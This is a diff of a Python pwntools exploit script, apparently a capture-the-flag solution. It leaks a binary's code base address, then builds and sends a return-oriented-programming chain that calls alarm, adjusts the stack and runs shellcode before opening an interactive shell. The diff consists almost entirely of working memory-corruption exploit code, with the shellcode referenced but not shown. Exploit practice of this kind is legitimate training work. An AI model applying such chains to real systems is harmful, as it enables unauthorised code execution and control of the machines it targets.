@@ -78,8 +78,8 @@ if __name__ == "__main__":
     #
     # leak the address of 0x8a2: mov edx,6
     #
-    s('mov r14,[rsp]')
-    r.send( assemble('dec r14; ret') * (0xb18 - 0x8a2) )
+    r.send(assemble('mov r14,[rsp]'))
+    r.send(assemble('dec r14; ret') * (0xb18 - 0x8a2))
     recv_all()
 
     s('push rsp; pop rsi; push r14')
@@ -90,27 +90,24 @@ if __name__ == "__main__":
     log.info("code base: 0x%x" % B)
 
     pop_rdi = 0xbc3 # pop rdi; ret
-    pop_rsi = 0xbc1 # pop rsi; pop r15; ret
-    pop_r13 = 0xbbe # pop r13; pop r14; pop r15; ret
-    mov_rdx_r13 = 0xba0 # mov rdx,r13; mov rsi,r14; mov edi,r15d; call qword [r12+rbx*8]
-    pop_rbx = 0xaab # pop rbx; pop r12; pop rbp; ret
-
-    # mov edx,7
-    # mov esi,0x1000
-    # mov rdi,addr
-    # call mprotect
 
     offset = 56
+
+    log.info("building opcodes...")
+
+    buf = ''
+    buf += p64(B + pop_rdi)             # 0x0
+    buf += p64(0)                       # 0x8
+    buf += p64(B + b.plt['alarm'])      # 0x10
+    buf += p64(B + pop_rdi)             # 0x18
+    buf += p64(0xcafebabe)              # 0x20
+    buf += p64(B + 0xa20)               # 0x28
+    buf += p64(0xcafebabe)              # 0x30
+    buf += adjust_stack                 # 0x38
+    buf += shellcode
+
     op = ''
-
-    op += write_string(offset, p64(B + pop_rdi))
-
-    op += movb_r15(0)
-    op += store_r15(offset + 0x8)
-
-    op += write_string(offset + 0x10, p64(B + b.plt['alarm']))
-
-    op += write_string(offset + 0x18, p64(B + pop_rdi))
+    op += write_string(offset, buf)
 
     op += assemble('mov r14,rcx')
     op += assemble('push rsp; pop r15')
@@ -119,18 +116,14 @@ if __name__ == "__main__":
     op += assemble('and r15,r14')
     op += store_r15(offset + 0x20)
 
-    op += mov_r15_retaddr()
-    op += assemble('dec r15') * (0xb18 - 0xa20)
-    op += store_r15(offset + 0x28)
-
     op += assemble('push rsp; pop r15')
-    op += assemble('inc r15') * (offset + 0x70)
+    op += assemble('inc r15') * (offset + 0x38)
     op += store_r15(offset + 0x30)
-
-    op += write_string(offset + 0x70, adjust_stack + shellcode)
 
     op += movb_r15(offset)
     op += assemble('add rsp,r15; ret')
 
+    log.info("sending %d bytes..." % len(op))
     r.send(op)
+    r.clean()
     r.interactive()
